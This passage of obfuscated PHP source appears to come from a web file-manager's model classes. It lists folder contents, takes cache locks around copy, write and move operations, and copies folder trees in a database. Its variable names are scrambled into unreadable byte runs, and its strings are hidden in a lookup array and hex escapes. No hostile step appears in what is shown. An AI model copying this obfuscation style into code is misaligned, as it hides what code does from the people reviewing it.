$ï—Üæõó = Model($°¡Ô÷Şä[610])->getInfoFull($†¦ñšŞ[$°¡Ô÷Şä[582]]); $Ÿ†Ç¬ËÇ = _get($ï—Üæõó, $°¡Ô÷Şä[612], $°¡Ô÷Şä[12]); $†¦ñšŞ[$°¡Ô÷Şä[618]] = Model($°¡Ô÷Şä[590])->getInfoSimpleOuter($†¦ñšŞ[$°¡Ô÷Şä[582]]); $Â´²Úä¶ = LNG($°¡Ô÷Şä[619]) . $°¡Ô÷Şä[176] . $†¦ñšŞ[$°¡Ô÷Şä[618]][$°¡Ô÷Şä[32]] . $°¡Ô÷Şä[178]; if ($Ú®‰ñÍ && $Ú®‰ñÍ[0] == $Ÿ†Ç¬ËÇ || !$Ú®‰ñÍ && $†¦ñšŞ[$°¡Ô÷Şä[194]] == $Ÿ†Ç¬ËÇ) { $Â´²Úä¶ = LNG($°¡Ô÷Şä[619]) . $°¡Ô÷Şä[620] . $†¦ñšŞ[$°¡Ô÷Şä[618]][$°¡Ô÷Şä[32]] . $°¡Ô÷Şä[616] . LNG($°¡Ô÷Şä[617]) . $°¡Ô÷Şä[178]; } } } else { if ($†¦ñšŞ[$°¡Ô÷Şä[191]] == self::TYPE_GROUP) { $áà„É› = Model($°¡Ô÷Şä[598])->getInfoSimple($†¦ñšŞ[$°¡Ô÷Şä[582]]); $Â´²Úä¶ = $áà„É›[$°¡Ô÷Şä[32]]; } else { if ($†¦ñšŞ[$°¡Ô÷Şä[191]] == self::TYPE_SYSTEM) { $Â´²Úä¶ = $°¡Ô÷Şä[621]; } } } $Â´²Úä¶ = $Â´²Úä¶ ? $°¡Ô÷Şä[8] . $Â´²Úä¶ . $°¡Ô÷Şä[8] : $°¡Ô÷Şä[8]; return $Â´²Úä¶; } protected function _listAppendUser(&$Æ·„¨±¼) { $¼óšê÷ =& $_SERVER[®»±”ó²]; $ÓìòàŠ’ = array_to_keyvalue($Æ·„¨±¼, $¼óšê÷[12], $¼óšê÷[538]); $¬ÒÚ²Ä  = array_to_keyvalue($Æ·„¨±¼, $¼óšê÷[12], $¼óšê÷[540]); $®©”¿¶› = array_merge($ÓìòàŠ’, $¬ÒÚ²Ä ); $ëûÏ¬¶Â = Model($¼óšê÷[610])->userListInfo($®©”¿¶›); foreach ($Æ·„¨±¼ as &$ğ‚¼¿) { $¨‰¿˜·ñ = $ğ‚¼¿[$¼óšê÷[538]]; $ğ‚¼¿[$¼óšê÷[538]] = $ëûÏ¬¶Â[$¨‰¿˜·ñ] ? $ëûÏ¬¶Â[$¨‰¿˜·ñ] : !1; $¨‰¿˜·ñ = $ğ‚¼¿[$¼óšê÷[540]]; $ğ‚¼¿[$¼óšê÷[540]] = $ëûÏ¬¶Â[$¨‰¿˜·ñ] ? $ëûÏ¬¶Â[$¨‰¿˜·ñ] : !1; if (_get($ğ‚¼¿, $¼óšê÷[622], 0)) { $ˆÀ£¬éò = $GLOBALS[$¼óšê÷[6]][$¼óšê÷[92]][$¼óšê÷[623]]; if ($ğ‚¼¿[$¼óšê÷[552]][$¼óšê÷[624]] <= time() - $ˆÀ£¬éò) { $this->metaSet($ğ‚¼¿[$¼óšê÷[194]], $¼óšê÷[625], null); $this->metaSet($ğ‚¼¿[$¼óšê÷[194]], $¼óšê÷[624], null); unset($ğ‚¼¿[$¼óšê÷[552]][$¼óšê÷[625]]); continue; } $¦Œêî’ˆ = $ğ‚¼¿[$¼óšê÷[552]][$¼óšê÷[625]]; $ğ‚¼¿[$¼óšê÷[552]][$¼óšê÷[626]] = Model($¼óšê÷[610])->getInfoSimpleOuter($¦Œêî’ˆ); } } unset($ğ‚¼¿); } public function parentLevelArray($ôÂ—“Şé) { $¶éŠû‹¥ =& $_SERVER[®»±”ó²]; $ôÂ—“Şé = explode($¶éŠû‹¥[50], trim($ôÂ—“Şé, $¶éŠû‹¥[50])); return array_remove_value($ôÂ—“Şé, $¶éŠû‹¥[231]); } public function listAll($†¾¤ùÅ) { $¨Ğ”›¼è =& $_SERVER[®»±”ó²]; $©¸€Õ´ = $this->sourceInfo($†¾¤ùÅ); $Î‚ÌÂ• = array($¨Ğ”›¼è[627] => array($¨Ğ”›¼è[628], $©¸€Õ´[$¨Ğ”›¼è[597]] . $†¾¤ùÅ . $¨Ğ”›¼è[629]), $¨Ğ”›¼è[630] => 0); $Ë·ì Õà = $¨Ğ”›¼è[631]; $ÛüÆ‰ƒĞ = "\114\105\106\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\146\x69\154\x65\40\146\151\x6c\x65\x20\x6f\x6e\x20\x73\157\165\162\143\x65\56\146\151\154\x65\111\x44\40\75\x20\x66\x69\154\145\x2e\146\151\154\145\x49\104"; $¾¦ÉŠÙ¤ = $this->alias($¨Ğ”›¼è[530])->field($Ë·ì Õà)->where($Î‚ÌÂ•)->join($ÛüÆ‰ƒĞ)->select(); $this->_listAppendAuth($¾¦ÉŠÙ¤); $this->_listAppendUser($¾¦ÉŠÙ¤); $this->_listAppendPath($¾¦ÉŠÙ¤); $¾¦ÉŠÙ¤ = array_to_keyvalue($¾¦ÉŠÙ¤, $¨Ğ”›¼è[194]); $ûÚÌ‰ş = "\57{$©¸€Õ´[$¨Ğ”›¼è[32]]}\x2f"; $ûÚÌ‰ş = $ûÚÌ‰ş == $¨Ğ”›¼è[257] ? $¨Ğ”›¼è[8] : $ûÚÌ‰ş; $¼‹éøÛù = array(); foreach ($¾¦ÉŠÙ¤ as $’ùåèıŠ => $Éï±¸Ø¸) { $×à„€ÜÍ = $this->parentLevelArray($Éï±¸Ø¸[$¨Ğ”›¼è[597]]); array_shift($×à„€ÜÍ); $üåé¦ = $ûÚÌ‰ş; for ($Ù¨ÃÜşì = 0; $Ù¨ÃÜşì < count($×à„€ÜÍ); $Ù¨ÃÜşì++) { $üåé¦ .= $¾¦ÉŠÙ¤[$×à„€ÜÍ[$Ù¨ÃÜşì]][$¨Ğ”›¼è[32]] . $¨Ğ”›¼è[8]; } $üåé¦ .= $Éï±¸Ø¸[$¨Ğ”›¼è[32]]; if ($Éï±¸Ø¸[$¨Ğ”›¼è[496]]) { $üåé¦ .= $¨Ğ”›¼è[8]; } $Ñ·Š”Å = array($¨Ğ”›¼è[506] => str_replace($¨Ğ”›¼è[257], $¨Ğ”›¼è[8], str_replace($¨Ğ”›¼è[257], $¨Ğ”›¼è[8], str_replace($¨Ğ”›¼è[257], $¨Ğ”›¼è[8], $üåé¦))), $¨Ğ”›¼è[632] => intval($Éï±¸Ø¸[$¨Ğ”›¼è[496]]), $¨Ğ”›¼è[633] => intval($Éï±¸Ø¸[$¨Ğ”›¼è[79]]), $¨Ğ”›¼è[88] => intval($Éï±¸Ø¸[$¨Ğ”›¼è[88]]), $¨Ğ”›¼è[90] => $this->pathInfoFilter($Éï±¸Ø¸)); if (!$Ñ·Š”Å[$¨Ğ”›¼è[496]]) { $Ñ·Š”Å[$¨Ğ”›¼è[554]] = $Éï±¸Ø¸[$¨Ğ”›¼è[554]]; } $¼‹éøÛù[] = $Ñ·Š”Å; } $¼‹éøÛù = array_sort_by($¼‹éøÛù, $¨Ğ”›¼è[87]); return $¼‹éøÛù; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¯··°Íä) { $åëÇ Ş =& $_SERVER[®»±”ó²]; if (!$this->allowLock()) { return; } $this->_lockCheck($åëÇ Ş[634], $¯··°Íä); $–²œùÍá = 1; $this->_lockEvent($¯··°Íä, array($åëÇ Ş[635], $åëÇ Ş[636]), $–²œùÍá); $this->_lockParent($¯··°Íä, array($åëÇ Ş[636]), $–²œùÍá); $this->_lockEvent($¯··°Íä, array($åëÇ Ş[637], $åëÇ Ş[638]), $–²œùÍá); $this->_lockCheckEnd($åëÇ Ş[634], $¯··°Íä); } public function lockCopyEnd($ÒÔÂßÖ«) { $‰êï´˜Æ =& $_SERVER[®»±”ó²]; if (!$this->allowLock()) { return; } $´ğß£„ƒ = 0; $this->_lockEvent($ÒÔÂßÖ«, array($‰êï´˜Æ[635], $‰êï´˜Æ[636]), $´ğß£„ƒ); $this->_lockParent($ÒÔÂßÖ«, array($‰êï´˜Æ[636]), $´ğß£„ƒ); $this->_lockEvent($ÒÔÂßÖ«, array($‰êï´˜Æ[637], $‰êï´˜Æ[638]), $´ğß£„ƒ); } public function lockWriteStart($¯ˆª‚èÃ, $¸£ˆÜ™à = '') { $ÜòÖÎ =& $_SERVER[®»±”ó²]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÜòÖÎ[635], $¯ˆª‚èÃ); $Îøóôš = 1; $this->_lockKey($ÜòÖÎ[639] . $¯ˆª‚èÃ . $ÜòÖÎ[10] . $¸£ˆÜ™à, $Îøóôš); $this->_lockEvent($¯ˆª‚èÃ, array($ÜòÖÎ[634], $ÜòÖÎ[636]), $Îøóôš); $this->_lockParent($¯ˆª‚èÃ, array($ÜòÖÎ[634], $ÜòÖÎ[636]), $Îøóôš); $this->_lockCheckEnd($ÜòÖÎ[635], $¯ˆª‚èÃ); } public function lockWriteEnd($ëÂ±µ, $ëş†õ  = '') { $˜±Õıò÷ =& $_SERVER[®»±”ó²]; if (!$this->allowLock()) { return; } $âÒê¾÷Õ = 0; $this->_lockKey($˜±Õıò÷[639] . $ëÂ±µ . $˜±Õıò÷[10] . $ëş†õ , $âÒê¾÷Õ); $this->_lockEvent($ëÂ±µ, array($˜±Õıò÷[634], $˜±Õıò÷[636]), $âÒê¾÷Õ); $this->_lockParent($ëÂ±µ, array($˜±Õıò÷[634], $˜±Õıò÷[636]), $âÒê¾÷Õ); } public function lockMoveStart($»ø¤™ĞÌ) { $ì–’¢Ò† =& $_SERVER[®»±”ó²]; if (!$this->allowLock()) { return; } $this->_lockCheck($ì–’¢Ò†[636], $»ø¤™ĞÌ); $ÑæÍ‚“Ã = 1; $this->_lockKey($ì–’¢Ò†[640] . $»ø¤™ĞÌ, $ÑæÍ‚“Ã); $this->_lockEvent($»ø¤™ĞÌ, array($ì–’¢Ò†[634], $ì–’¢Ò†[635]), $ÑæÍ‚“Ã); $this->_lockParent($»ø¤™ĞÌ, array($ì–’¢Ò†[634], $ì–’¢Ò†[636]), $ÑæÍ‚“Ã); $this->_lockEvent($»ø¤™ĞÌ, array($ì–’¢Ò†[641], $ì–’¢Ò†[637], $ì–’¢Ò†[638]), $ÑæÍ‚“Ã); $this->_lockCheckEnd($ì–’¢Ò†[636], $»ø¤™ĞÌ); } public function lockMoveEnd($±ªµ”óÕ) { $Õ•ùÜÍº =& $_SERVER[®»±”ó²]; if (!$this->allowLock()) { return; } $§²Ä°Ñó = 0; $this->_lockKey($Õ•ùÜÍº[640] . $±ªµ”óÕ, $§²Ä°Ñó); $this->_lockEvent($±ªµ”óÕ, array($Õ•ùÜÍº[634], $Õ•ùÜÍº[635]), $§²Ä°Ñó); $this->_lockParent($±ªµ”óÕ, array($Õ•ùÜÍº[634], $Õ•ùÜÍº[636]), $§²Ä°Ñó); $this->_lockEvent($±ªµ”óÕ, array($Õ•ùÜÍº[641], $Õ•ùÜÍº[637], $Õ•ùÜÍº[638]), $§²Ä°Ñó); } private function _lockCheck($«şÔ×ì, $±¡ÖóÆ) { $ÓúáÄ›é =& $_SERVER[®»±”ó²]; $Áƒ¤ä²¶ = $this->sourceInfo($±¡ÖóÆ); $ñ±ôìíÔ = $«şÔ×ì . $ÓúáÄ›é[10] . $±¡ÖóÆ; $this->_lockTimeStart[$ñ±ôìíÔ] = timeFloat(); if (!is_array($Áƒ¤ä²¶)) { return; } $çÙ¤úò = LNG($ÓúáÄ›é[642]); CacheLock::setErrorMsg($ÓúáÄ›é[176] . htmlspecialchars($Áƒ¤ä²¶[$ÓúáÄ›é[32]]) . $ÓúáÄ›é[178] . $çÙ¤úò); $this->_lockKey($ñ±ôìíÔ, 1); $this->_lockKey($ñ±ôìíÔ, 0); $”ïóºáÓ = array_reverse($this->parentLevelArray($Áƒ¤ä²¶[$ÓúáÄ›é[597]])); foreach ($”ïóºáÓ as $ŒÎÛÄµË) { $ñ±ôìíÔ = $«şÔ×ì . $ÓúáÄ›é[643] . $ŒÎÛÄµË; if (CacheLock::lockGet($ÓúáÄ›é[644] . $ñ±ôìíÔ)) { $Áƒ¤ä²¶ = $this->sourceInfo($ŒÎÛÄµË); CacheLock::setErrorMsg($ÓúáÄ›é[176] . htmlspecialchars($Áƒ¤ä²¶[$ÓúáÄ›é[32]]) . $ÓúáÄ›é[178] . $çÙ¤úò); $this->_lockKey($ñ±ôìíÔ, 1); $this->_lockKey($ñ±ôìíÔ, 0); } } } private function _lockCheckEnd($Û«íòÙ, $èÅ„ß¨…) { $è—ûŸ´¦ =& $_SERVER[®»±”ó²]; $¦òØ–£û = $Û«íòÙ . $è—ûŸ´¦[10] . $èÅ„ß¨…; CacheLock::setErrorMsg($è—ûŸ´¦[456]); if (!isset($this->_lockTimeStart[$¦òØ–£û])) { return; } $ÒÇİ‡‰ = timeFloat() - $this->_lockTimeStart[$¦òØ–£û]; unset($this->_lockTimeStart[$¦òØ–£û]); if ($ÒÇİ‡‰ > 0.5) { unset(self::$cacheSourceInfo[$è—ûŸ´¦[544] . $èÅ„ß¨…]); } $¯»½£éù = $this->sourceInfo($èÅ„ß¨…); if (!$¯»½£éù) { show_json(LNG($è—ûŸ´¦[108]), !1); } } private function _lockParent($¸Œˆ’Õ, $ë±…ßŠ, $Çˆ¥¼Éğ) { if (!$this->autoLockSet) { return; } $Å´áŒª± = $this->sourceInfo($¸Œˆ’Õ); if (!is_array($Å´áŒª±)) { return; } $û²ñû½´ = array_reverse($this->parentLevelArray($Å´áŒª±[$_SERVER[®»±”ó²][597]])); foreach ($û²ñû½´ as $µ·å½¯) { $this->_lockEvent($µ·å½¯, $ë±…ßŠ, $Çˆ¥¼Éğ); } } private function _lockEvent($¡‹’¤, $ ½ÎÑı, $ÅÜŒ¯¯¿) { $¨åëµÆ± =& $_SERVER[®»±”ó²]; if (!$this->autoLockSet) { return; } foreach ($ ½ÎÑı as $¢ÓäÁÓ½) { $á¡İÑÓº = $¢ÓäÁÓ½ . $¨åëµÆ±[10] . $¡‹’¤; if ($ÅÜŒ¯¯¿ && CacheLock::lockGet($¨åëµÆ±[644] . $á¡İÑÓº)) { continue; } $this->_lockKey($á¡İÑÓº, $ÅÜŒ¯¯¿); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($öÍ„¥Øì, $ÎÌù¨¯ó = 1) { $Ã§¢ĞıÜ = $_SERVER[®»±”ó²][644] . md5($öÍ„¥Øì); if ($ÎÌù¨¯ó) { if (isset(self::$_lockItemArr[$Ã§¢ĞıÜ])) { return; } self::$_lockItemArr[$Ã§¢ĞıÜ] = 1; CacheLock::lock($Ã§¢ĞıÜ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ã§¢ĞıÜ])) { return; } unset(self::$_lockItemArr[$Ã§¢ĞıÜ]); CacheLock::unlock($Ã§¢ĞıÜ); } } public function isParentOf($¹¹í«Ã, $Óş–Ÿó’) { $…¦œ¥´ =& $_SERVER[®»±”ó²]; $ØÉ…ÒöÚ = $this->sourceInfo($¹¹í«Ã); $£ÛÏÀ = $this->sourceInfo($Óş–Ÿó’); $ËÛçúÚ = $ØÉ…ÒöÚ[$…¦œ¥´[597]] . $ØÉ…ÒöÚ[$…¦œ¥´[194]] . $…¦œ¥´[50]; $’ó¿ç“‹ = $£ÛÏÀ[$…¦œ¥´[597]] . $£ÛÏÀ[$…¦œ¥´[194]] . $…¦œ¥´[50]; $™™ğ’éİ = strpos($’ó¿ç“‹, $ËÛçúÚ) === 0; return $™™ğ’éİ; } private $targetIsDelete = 0; public function copy($ˆÕ—í÷§, $¦úÌÆŒÓ, $éºõˆ´º = REPEAT_REPLACE, $‹§Ñºö = '') { $Ùš“¹ç =& $_SERVER[®»±”ó²]; $¦ä‡üœŸ = $this->sourceInfo($ˆÕ—í÷§); $²‚Ğ– = $this->sourceInfo($¦úÌÆŒÓ); if (!$¦ä‡üœŸ || !$²‚Ğ– || $²‚Ğ–[$Ùš“¹ç[496]] != $Ùš“¹ç[91]) { return !1; } if ($this->isParentOf($ˆÕ—í÷§, $¦úÌÆŒÓ)) { return !1; } $­è¬Í‚¸ = $‹§Ñºö ? $‹§Ñºö : $¦ä‡üœŸ[$Ùš“¹ç[32]]; $this->lockCopyStart($ˆÕ—í÷§); $this->lockWriteStart($¦úÌÆŒÓ, $­è¬Í‚¸); $ˆÓÀ±İë = array($Ùš“¹ç[645] => array(), $Ùš“¹ç[646] => array(), $Ùš“¹ç[647] => array()); $this->targetIsDelete = intval($¦ä‡üœŸ[$Ùš“¹ç[516]]); $ó‚ Úö = $this->fileNameExistAuto($¦úÌÆŒÓ, $¦ä‡üœŸ); $÷Úü¢© = $this->_copy($ˆÕ—í÷§, $¦úÌÆŒÓ, $éºõˆ´º, $ˆÓÀ±İë, !0, $‹§Ñºö); $this->_childrenListClear(); $this->lockCopyEnd($ˆÕ—í÷§); $this->lockWriteEnd($¦úÌÆŒÓ, $­è¬Í‚¸); if ($¦ä‡üœŸ[$Ùš“¹ç[496]] == $Ùš“¹ç[91] && $ó‚ Úö == $÷Úü¢©) { $this->folderSizeResetChildren($ó‚ Úö); } Model($Ùš“¹ç[648])->addAll($ˆÓÀ±İë[$Ùš“¹ç[646]], array(), !0); if ($ó‚ Úö != $÷Úü¢© || $¦ä‡üœŸ[$Ùš“¹ç[496]] == $Ùš“¹ç[91]) { Model($Ùš“¹ç[649])->eventCopy($÷Úü¢©); } $this->saveAll($ˆÓÀ±İë[$Ùš“¹ç[647]]); Model($Ùš“¹ç[233])->linkAdd($ˆÓÀ±İë[$Ùš“¹ç[645]]); $this->folderSizeReset($¦úÌÆŒÓ); $this->updateModifyTime($¦úÌÆŒÓ); return $÷Úü¢©; } private function _copy($ğ¦˜ü³ä, $À¼ƒß¸, $ˆŒüƒ‡ş, &$£Î¾°Ÿ, $Åş£’„Û, $–áØ„ ™ = '') { $ëğ“ƒßÔ =& $_SERVER[®»±”ó²]; $úæ›‚ìò = $this->sourceInfoCache($ğ¦˜ü³ä); $¯üŸäá— = $úæ›‚ìò[$ëğ“ƒßÔ[496]] == $ëğ“ƒßÔ[91]; $¶Ç¨·¸± = $–áØ„ ™ ? $–áØ„ ™ : $úæ›‚ìò[$ëğ“ƒßÔ[32]]; $±…ó§ÆÌ = $this->fileNameExistAuto($À¼ƒß¸, $úæ›‚ìò); if ($Åş£’„Û) { $this->_childrenAllMake($ğ¦˜ü³ä); if ($¯üŸäá— && $±…ó§ÆÌ) { $this->_childrenAllMake($±…ó§ÆÌ); } } if (!$±…ó§ÆÌ) { return $this->_copyCreate($ğ¦˜ü³ä, $À¼ƒß¸, $¶Ç¨·¸±, $£Î¾°Ÿ); } $«©î³¦Ì = $±…ó§ÆÌ; if ($¯üŸäá—) { if ($ˆŒüƒ‡ş == REPEAT_RENAME_FOLDER) { $¶Ç¨·¸± = $this->fileNameAutoCache($À¼ƒß¸, $¶Ç¨·¸±, $ˆŒüƒ‡ş, $¯üŸäá—); $«©î³¦Ì = $this->_copyCreate($ğ¦˜ü³ä, $À¼ƒß¸, $¶Ç¨·¸±, $£Î¾°Ÿ); } else { $íÖŒ¼º = $this->_childrenList($ğ¦˜ü³ä); foreach ($íÖŒ¼º as $°µˆíğä) { $this->_copy($°µˆíğä[$ëğ“ƒßÔ[194]], $±…ó§ÆÌ, $ˆŒüƒ‡ş, $£Î¾°Ÿ, !1); } } } else { if ($ˆŒüƒ‡ş == REPEAT_RENAME || $ˆŒüƒ‡ş == REPEAT_RENAME_FOLDER) { $¶Ç¨·¸± = $this->fileNameAutoCache($À¼ƒß¸, $¶Ç¨·¸±, $ˆŒüƒ‡ş, $¯üŸäá—); $«©î³¦Ì = $this->_copyCreate($ğ¦˜ü³ä, $À¼ƒß¸, $¶Ç¨·¸±, $£Î¾°Ÿ); } else { if ($ˆŒüƒ‡ş == REPEAT_REPLACE) { $˜æŠ¾ºç = $this->sourceInfoCache($±…ó§ÆÌ); $Íşœôö¼ = $this->fileHistory($˜æŠ¾ºç, $úæ›‚ìò[$ëğ“ƒßÔ[554]], $úæ›‚ìò[$ëğ“ƒßÔ[79]]); if ($Íşœôö¼) { $£Î¾°Ÿ[$ëğ“ƒßÔ[645]][] = $úæ›‚ìò[$ëğ“ƒßÔ[554]]; } } else { if ($ˆŒüƒ‡ş == REPEAT_SKIP) { } } } Hook::trigger($ëğ“ƒßÔ[650], array($ëğ“ƒßÔ[651], $úæ›‚ìò, 0)); } return $«©î³¦Ì; } private function _copyCreate($ã í»·, $®Í‚Ãæ, $†Ë÷§É, &$ÄÆ³¡˜÷) { $ğº¢â« =& $_SERVER[®»±”ó²]; $à«±¬¹¦ = $this->sourceInfoCache($ã í»·); $Áá‘Ç¥Ü = $this->sourceInfoCache($®Í‚Ãæ); $‚ù½¼Úî = $this->_makeItemData($à«±¬¹¦, $Áá‘Ç¥Ü, $†Ë÷§É); Hook::trigger($ğº¢â«[652], $‚ù½¼Úî); Hook::trigger($ğº¢â«[653], array($ğº¢â«[654], $‚ù½¼Úî, 0)); $ãû²µ…ê = $this->add($‚ù½¼Úî); $ºıòÃ¬ç = array($ğº¢â«[194] => $ãû²µ…ê, $ğº¢â«[32] => $†Ë÷§É); $this->_copyApplyMeta($ºıòÃ¬ç, $ÄÆ³¡˜÷); if ($à«±¬¹¦[$ğº¢â«[496]] != $ğº¢â«[91]) { $ÄÆ³¡˜÷[$ğº¢â«[645]][] = $à«±¬¹¦[$ğº¢â«[554]]; return $ãû²µ…ê; } $‰ç¢±Æ = array(); $§à»ô÷ã = array(); $this->_childrenListAll($ã í»·, $‰ç¢±Æ); $ø¸™§¯Ê = count($‰ç¢±Æ); if ($ø¸™§¯Ê == 0) { return $ãû²µ…ê; } $®Ş¬Ö± = $this->sourceInfo($ãû²µ…ê); foreach ($‰ç¢±Æ as $Ä±âñé) { $Ê¼³Ó¨º = $this->_makeItemData($Ä±âñé, $®Ş¬Ö±, $Ä±âñé[$ğº¢â«[32]]); $Ê¼³Ó¨º[$ğº¢â«[597]] = $Ä±âñé[$ğº¢â«[597]]; $§à»ô÷ã[] = $Ê¼³Ó¨º; } $this->chunkEventSet($ğº¢â«[655], array($ğº¢â«[656], $‚ù½¼Úî, $ø¸™§¯Ê)); $this->addAll($§à»ô÷ã, array(), !1); $¦®ôÃÒÅ = $this->where(array($ğº¢â«[193] => $ãû²µ…ê))->select(); $¨æĞ³–Ó = $this->_childrenMakeRelation($‰ç¢±Æ, $¦®ôÃÒÅ); $¨æĞ³–Ó[$ã í»·] = $ãû²µ…ê; $é‘®¹ñô = array(); $òÇ—Ü = array(); foreach ($¦®ôÃÒÅ as $Ä±âñé) { $éˆ‡ä«‘ = $Ä±âñé[$ğº¢â«[194]]; $âİÃ„Û‡ = $this->_childrenMatch($¨æĞ³–Ó, $Ä±âñé, $®Ş¬Ö±); $é‘®¹ñô[] = array($ğº¢â«[194], $éˆ‡ä«‘, $ğº¢â«[193], $âİÃ„Û‡[$ğº¢â«[193]]); $òÇ—Ü[] = array($ğº¢â«[194], $éˆ‡ä«‘, $ğº¢â«[597], $âİÃ„Û‡[$ğº¢â«[597]]); $this->_copyApplyMeta($Ä±âñé, $ÄÆ³¡˜÷); if ($Ä±âñé[$ğº¢â«[496]] != $ğº¢â«[91]) { $ÄÆ³¡˜÷[$ğº¢â«[645]][] = $Ä±âñé[$ğº¢â«[554]]; } } $this->chunkEventSet($ğº¢â«[657], array($ğº¢â«[658], $‚ù½¼Úî, $ø¸™§¯Ê)); $this->saveAll($é‘®¹ñô); $this->chunkEventSet($ğº¢â«[659], array($ğº¢â«[660], $‚ù½¼Úî, $ø¸™§¯Ê)); $this->saveAll($òÇ—Ü); return $ãû²µ…ê; } private function _childrenMakeRelation($‰îÓëÅ›, $øè‡›­º) { $æÕÀ”Õ =& $_SERVER[®»±”ó²]; $È ÚÒÓƒ = array(); $¼•®‚‹ = array(); foreach ($‰îÓëÅ› as $šÁÍÈß¥) { $íœù™ = $šÁÍÈß¥[$æÕÀ”Õ[32]] . $æÕÀ”Õ[8] . $šÁÍÈß¥[$æÕÀ”Õ[597]]; $È ÚÒÓƒ[$íœù™] = $šÁÍÈß¥[$æÕÀ”Õ[194]]; } foreach ($øè‡›­º as $šÁÍÈß¥) { $íœù™ = $šÁÍÈß¥[$æÕÀ”Õ[32]] . $æÕÀ”Õ[8] . $šÁÍÈß¥[$æÕÀ”Õ[597]]; $€õ€Äªå = $È ÚÒÓƒ[$íœù™]; $¼•®‚‹[$€õ€Äªå] = $šÁÍÈß¥[$æÕÀ”Õ[194]]; } return $¼•®‚‹; } private function _childrenMatch($öæâˆÉÖ, $Œ±ï¯‚¹, $ÀÉû¨ğì) { $ÆëÂ°Í÷ =& $_SERVER[®»±”ó²]; $ó¿çÚ¼Ë = $ÀÉû¨ğì[$ÆëÂ°Í÷[597]]; $Ö˜â˜Ş­ = $this->parentLevelArray($Œ±ï¯‚¹[$ÆëÂ°Í÷[597]]); foreach ($Ö˜â˜Ş­ as $€ú–èç) { if (isset($öæâˆÉÖ[$€ú–èç])) { $ó¿çÚ¼Ë .= $öæâˆÉÖ[$€ú–èç] . $ÆëÂ°Í÷[661]; } } $ó¿çÚ¼Ë = rtrim($ó¿çÚ¼Ë, $ÆëÂ°Í÷[50]) . $ÆëÂ°Í÷[50]; $¯îø½®Ü = $this->parentLevelArray($ó¿çÚ¼Ë); $‘Ÿªà÷  = $¯îø½®Ü[count($¯îø½®Ü) - 1]; return array($ÆëÂ°Í÷[193] => $‘Ÿªà÷ , $ÆëÂ°Í÷[597] => $ó¿çÚ¼Ë); } private function _makeItemData($ÊØÄâœ®, $«õ°¬ıÑ, $øü—Øù) { $ÏĞæÄšÛ =& $_SERVER[®»±”ó²]; $Œé…™ö = array($ÏĞæÄšÛ[662] => $ÊØÄâœ®[$ÏĞæÄšÛ[496]], $ÏĞæÄšÛ[505] => $øü—Øù, $ÏĞæÄšÛ[663] => $ÊØÄâœ®[$ÏĞæÄšÛ[497]] ? $ÊØÄâœ®[$ÏĞæÄšÛ[497]] : $ÏĞæÄšÛ[12], $ÏĞæÄšÛ[555] => $ÊØÄâœ®[$ÏĞæÄšÛ[554]] ? $ÊØÄâœ®[$ÏĞæÄšÛ[554]] : 0, $ÏĞæÄšÛ[633] => $ÊØÄâœ®[$ÏĞæÄšÛ[79]] ? $ÊØÄâœ®[$ÏĞæÄšÛ[79]] : 0, $ÏĞæÄšÛ[664] => intval($«õ°¬ıÑ[$ÏĞæÄšÛ[191]]), $ÏĞæÄšÛ[665] => intval($«õ°¬ıÑ[$ÏĞæÄšÛ[582]]), $ÏĞæÄšÛ[666] => intval(USER_ID), $ÏĞæÄšÛ[667] => intval(USER_ID), $ÏĞæÄšÛ[488] => intval($«õ°¬ıÑ[$ÏĞæÄšÛ[194]]), $ÏĞæÄšÛ[668] => $«õ°¬ıÑ[$ÏĞæÄšÛ[597]] . $«õ°¬ıÑ[$ÏĞæÄšÛ[194]] . $ÏĞæÄšÛ[50], $ÏĞæÄšÛ[509] => $ÊØÄâœ®[$ÏĞæÄšÛ[88]] ? $ÊØÄâœ®[$ÏĞæÄšÛ[88]] : time(), $ÏĞæÄšÛ[515] => 0, $ÏĞæÄšÛ[669] => $ÏĞæÄšÛ[12]); return $Œé…™ö; } private function _copyApplyMeta($ï§šû”, &$Ò°Ù°Éº) { $ğÚ‚ó¼­ =& $_SERVER[®»±”ó²]; $¡Ã‹ô§ = $ï§šû”[$ğÚ‚ó¼­[194]]; $Ì«Ÿ¨ÄÆ = $ï§šû”[$ğÚ‚ó¼­[32]]; if (!isset($ï§šû”[$ğÚ‚ó¼­[670]]) || !$ï§šû”[$ğÚ‚ó¼­[670]] || $ï§šû”[$ğÚ‚ó¼­[670]] == $ğÚ‚ó¼­[231]) { $Ò°Ù°Éº[$ğÚ‚ó¼­[647]][] = array($ğÚ‚ó¼­[194], $¡Ã‹ô§, $ğÚ‚ó¼­[670], short_id($¡Ã‹ô§)); } if (Input::check($Ì«Ÿ¨ÄÆ, $ğÚ‚ó¼­[671])) { $Ò°Ù°Éº[$ğÚ‚ó¼­[646]][] = array($ğÚ‚ó¼­[194] => $¡Ã‹ô§, $ğÚ‚ó¼­[97] => $ğÚ‚ó¼­[549], $ğÚ‚ó¼­[452] => str_replace($ğÚ‚ó¼­[53], $ğÚ‚ó¼­[12], Pinyin::get($Ì«Ÿ¨ÄÆ))); $Ò°Ù°Éº[$ğÚ‚ó¼­[646]][] = array($ğÚ‚ó¼­[194] => $¡Ã‹ô§, $ğÚ‚ó¼­[97] => $ğÚ‚ó¼­[548], $ğÚ‚ó¼­[452] => Pinyin::get($Ì«Ÿ¨ÄÆ, $ğÚ‚ó¼­[672])); } $Ò°Ù°Éº[$ğÚ‚ó¼­[646]][] = array($ğÚ‚ó¼­[194] => $¡Ã‹ô§, $ğÚ‚ó¼­[97] => $ğÚ‚ó¼­[528], $ğÚ‚ó¼­[452] => KodSort::makeStr($Ì«Ÿ¨ÄÆ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($àŠ€‡ç“) { $òîêÍ£€ =& $_SERVER[®»±”ó²]; $ÕóÊ¥„“ = $this->sourceInfo($àŠ€‡ç“); $­ª¬ä¶» = $òîêÍ£€[673]; $­¦ÙÖ… = array($òîêÍ£€[597] => array($òîêÍ£€[628], $ÕóÊ¥„“[$òîêÍ£€[597]] . $àŠ€‡ç“ . $òîêÍ£€[629]), $òîêÍ£€[516] => $this->targetIsDelete); $Áœ‡İ°Õ = 